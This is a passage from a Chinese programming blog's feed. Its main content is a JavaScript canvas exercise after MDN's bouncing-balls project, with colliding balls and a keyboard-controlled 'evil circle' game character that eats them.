href="https://www.bilibili.com/video/BV1Zy4y1K7SH?p=2&vd_source=912ed42988e804b7f37b350d6c75cddd">尚硅谷Vue2.0+Vue3.0全套教程丨vuejs从入门到精通</a></p><p><a href="https://cn.vuejs.org/guide/introduction.html#pick-your-learning-path">VUE官方文档</a></p><p>bootCDN</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js彩色弹球练习</title>
    <link href="/2023/11/21/2023/js%E5%BD%A9%E8%89%B2%E5%BC%B9%E7%90%83%E7%BB%83%E4%B9%A0/"/>
    <url>/2023/11/21/2023/js%E5%BD%A9%E8%89%B2%E5%BC%B9%E7%90%83%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>练习项目地址：<a href="https://github.com/mdn/learning-area/blob/main/javascript/oojs/bouncing-balls/">https://github.com/mdn/learning-area/blob/main/javascript/oojs/bouncing-balls/</a></p><p>效果：<a href="https://mdn.github.io/learning-area/javascript/oojs/assessment/">https://mdn.github.io/learning-area/javascript/oojs/assessment/</a></p><h1 id="class类写法"><a href="#class类写法" class="headerlink" title="class类写法"></a>class类写法</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 设置画布</span><br><br><span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;canvas&#x27;</span>);<br><span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&#x27;2d&#x27;</span>);<br><br><span class="hljs-keyword">const</span> width = canvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;<br><span class="hljs-keyword">const</span> height = canvas.<span class="hljs-property">height</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;<br><br><span class="hljs-comment">//随机数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">random</span>(<span class="hljs-params">min, max</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (max - min + <span class="hljs-number">1</span>)) + min;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">randomRGB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`rgb(<span class="hljs-subst">$&#123;random(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)&#125;</span>,<span class="hljs-subst">$&#123;random(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)&#125;</span>,<span class="hljs-subst">$&#123;random(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)&#125;</span>)`</span>;<br>&#125;<br><br><br><span class="hljs-comment">//建立小球</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ball</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x, y, velX, velY, color, size</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = y;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = velX;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = velY;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = size;<br>  &#125;<br>  <span class="hljs-comment">//画</span><br>  <span class="hljs-title function_">draw</span>(<span class="hljs-params"></span>) &#123;<br>  ctx.<span class="hljs-title function_">beginPath</span>();<br>  ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>;<br>  ctx.<span class="hljs-title function_">arc</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>);<br>  ctx.<span class="hljs-title function_">fill</span>();<br>  &#125;<br><span class="hljs-comment">// 更新</span><br>  <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &gt;= width) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &gt;= height) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>);<br>  &#125;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>&#125;<br><span class="hljs-comment">// 碰撞检测</span><br>  <span class="hljs-title function_">collisionDetect</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> ball <span class="hljs-keyword">of</span> balls) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> !== ball) &#123;<br>      <span class="hljs-keyword">const</span> dx = <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> - ball.<span class="hljs-property">x</span>;<br>      <span class="hljs-keyword">const</span> dy = <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> - ball.<span class="hljs-property">y</span>;<br>      <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(dx * dx + dy * dy);<br><br>      <span class="hljs-keyword">if</span> (distance &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> + ball.<span class="hljs-property">size</span>) &#123;<br>        ball.<span class="hljs-property">color</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = <span class="hljs-title function_">randomRGB</span>();<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br>&#125;<br><br><span class="hljs-keyword">const</span> balls = [];<br><br><span class="hljs-keyword">while</span> (balls.<span class="hljs-property">length</span> &lt; <span class="hljs-number">25</span>) &#123;<br>  <span class="hljs-keyword">const</span> size = <span class="hljs-title function_">random</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br>  <span class="hljs-keyword">const</span> ball = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ball</span>(<br>    <span class="hljs-comment">// ball position always drawn at least one ball width</span><br>    <span class="hljs-comment">// away from the edge of the canvas, to avoid drawing errors</span><br>    <span class="hljs-title function_">random</span>(<span class="hljs-number">0</span> + size, width - size),<br>    <span class="hljs-title function_">random</span>(<span class="hljs-number">0</span> + size, height - size),<br>    <span class="hljs-title function_">random</span>(-<span class="hljs-number">7</span>, <span class="hljs-number">7</span>),<br>    <span class="hljs-title function_">random</span>(-<span class="hljs-number">7</span>, <span class="hljs-number">7</span>),<br>    <span class="hljs-title function_">randomRGB</span>(),<br>    size,<br>  );<br><br>  balls.<span class="hljs-title function_">push</span>(ball);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">loop</span>(<span class="hljs-params"></span>) &#123;<br>  ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-string">&quot;rgba(0, 0, 0, 0.25)&quot;</span>;<br>  ctx.<span class="hljs-title function_">fillRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height);<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> ball <span class="hljs-keyword">of</span> balls) &#123;<br>    ball.<span class="hljs-title function_">draw</span>();<br>    ball.<span class="hljs-title function_">update</span>();<br>    ball.<span class="hljs-title function_">collisionDetect</span>();<br>  &#125;<br><br>  <span class="hljs-title function_">requestAnimationFrame</span>(loop);<br>&#125;<br><span class="hljs-title function_">loop</span>();<br></code></pre></td></tr></table></figure><p>增加恶魔圈版本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//</span><br><span class="hljs-keyword">const</span> ballcount = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;p&#x27;</span>);<br><br><span class="hljs-comment">// 设置画布</span><br><br><span class="hljs-keyword">const</span> canvas = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&#x27;canvas&#x27;</span>);<br><span class="hljs-keyword">const</span> ctx = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">&#x27;2d&#x27;</span>);<br><br><span class="hljs-keyword">const</span> width = canvas.<span class="hljs-property">width</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>;<br><span class="hljs-keyword">const</span> height = canvas.<span class="hljs-property">height</span> = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>;<br><br><span class="hljs-comment">//随机数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">random</span>(<span class="hljs-params">min, max</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * (max - min + <span class="hljs-number">1</span>)) + min;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">randomRGB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`rgb(<span class="hljs-subst">$&#123;random(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)&#125;</span>,<span class="hljs-subst">$&#123;random(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)&#125;</span>,<span class="hljs-subst">$&#123;random(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>)&#125;</span>)`</span>;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span>&#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x, y, velX, velY</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = x;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = y;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = velX;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = velY;<br> &#125;&#125;<br><br><span class="hljs-comment">//建立小球</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ball</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Shape</span> &#123;<br>  exists = <span class="hljs-number">1</span>;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x, y, velX, velY, color, size</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(x,y,velX,velY);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = color;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = size;<br>  &#125;<br>  <span class="hljs-comment">//画</span><br>  <span class="hljs-title function_">draw</span>(<span class="hljs-params"></span>) &#123;<br>    ctx.<span class="hljs-title function_">beginPath</span>();<br>    ctx.<span class="hljs-property">fillStyle</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>;<br>    ctx.<span class="hljs-title function_">arc</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>);<br>    ctx.<span class="hljs-title function_">fill</span>();<br>  &#125;<br><span class="hljs-comment">// 更新</span><br>  <span class="hljs-title function_">update</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &gt;= width) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &gt;= height) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = -(<span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>);<br>  &#125;<br><br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>&#125;<br><span class="hljs-comment">// 碰撞检测</span><br>  <span class="hljs-title function_">collisionDetect</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> ball <span class="hljs-keyword">of</span> balls) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span> !== ball) &#123;<br>       <span class="hljs-keyword">const</span> dx = <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> - ball.<span class="hljs-property">x</span>;<br>      <span class="hljs-keyword">const</span> dy = <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> - ball.<span class="hljs-property">y</span>;<br>      <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(dx * dx + dy * dy);<br><br>      <span class="hljs-keyword">if</span> (distance &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> + ball.<span class="hljs-property">size</span>) &#123;<br>        ball.<span class="hljs-property">color</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span> = <span class="hljs-title function_">randomRGB</span>();<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br>&#125;<br><br><span class="hljs-comment">//恶魔圈</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilCircle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Shape</span>&#123;<br>  color = <span class="hljs-string">&quot;rgba(255,255,255,1)&quot;</span>;<br>  size = <span class="hljs-number">10</span>;<br>  velX = <span class="hljs-number">20</span>;<br>  velY = <span class="hljs-number">20</span>;<br><br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">x, y</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(x, y);<br><br>    <span class="hljs-comment">//按键监听</span><br>    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;keydown&quot;</span>,<span class="hljs-function">(<span class="hljs-params">e</span>)=&gt;</span>&#123;<br>      <span class="hljs-keyword">switch</span>(e.<span class="hljs-property">key</span>)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;a&quot;</span>:<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> -= <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;d&quot;</span>:<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;w&quot;</span>:<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> -= <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;s&quot;</span>:<br>          <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>      &#125;&#125;<br>    );<br>  &#125;<br><br>  <span class="hljs-title function_">draw</span>(<span class="hljs-params"></span>)&#123;<br>    ctx.<span class="hljs-title function_">beginPath</span>();<br>    ctx.<span class="hljs-property">lineWidth</span> = <span class="hljs-number">3</span>;<br>    ctx.<span class="hljs-property">strokeStyle</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">color</span>; <span class="hljs-comment">//空心</span><br>    ctx.<span class="hljs-title function_">arc</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>);<br>    ctx.<span class="hljs-title function_">stroke</span>();<br>  &#125;<br>  <span class="hljs-title function_">checkBounds</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &gt;= width) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> -= <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>       <span class="hljs-comment">// this.x += this.velX;</span><br>       <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &gt;= height) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> -= <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> - <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) &lt;= <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>    &#125;<br><br>  &#125;<br>  <span class="hljs-title function_">collisionDetect</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> ball <span class="hljs-keyword">of</span> balls) &#123;<br>      <span class="hljs-keyword">if</span> (ball.<span class="hljs-property">exists</span>) &#123;<br>        <span class="hljs-keyword">const</span> dx = <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> - ball.<span class="hljs-property">x</span>;<br>        <span class="hljs-keyword">const</span> dy = <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> - ball.<span class="hljs-property">y</span>;<br>        <span class="hljs-keyword">const</span> distance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(dx * dx + dy * dy);<br><br>        <span class="hljs-keyword">if</span> (distance &lt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> + ball.<span class="hljs-property">size</span>) &#123;<br>          ball.<span class="hljs-property">exists</span> = <span class="hljs-number">0</span>;<br>          countnum = <span class="hljs-title function_">count</span>();<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <br>&#125;<br><br><span class="hljs-keyword">const</span> evilcircle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">EvilCircle</span>(<span class="hljs-number">50</span>,<span class="hljs-number">50</span>);<br><br><span class="hljs-keyword">const</span> balls = [];<br><br><span class="hljs-keyword">while</span> (balls.<span class="hljs-property">length</span> &lt; <span class="hljs-number">25</span>) &#123;<br>  <span class="hljs-keyword">const</span> size = <span class="hljs-title function_">random</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);<br>  <span class="hljs-keyword">const</span> ball = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ball</span>(<br>    <span class="hljs-comment">// ball position always drawn at least one ball width</span><br>    <span class="hljs-comment">// away from the edge of the canvas, to avoid drawing errors</span><br>    <span class="hljs-title function_">random</span>(<span class="hljs-number">0</span> + size, width - size),<br>    <span class="hljs-title function_">random</span>(<span class="hljs-number">0</span> + size, height - size),<br>    <span class="hljs-title function_">random</span>(-<span class="hljs-number">7</span>, <span class="hljs-number">7</span>),<br>    <span class="hljs-title function_">random</span>(-<span class="hljs-number">7</span>, <span class="hljs-number">7</span>),<br>    <span class="hljs-title function_">randomRGB</span>(),<br>    size,<br>  );<br><br>  balls.<span class="hljs-title function_">push</span>(ball);<br>&#125;<br><span 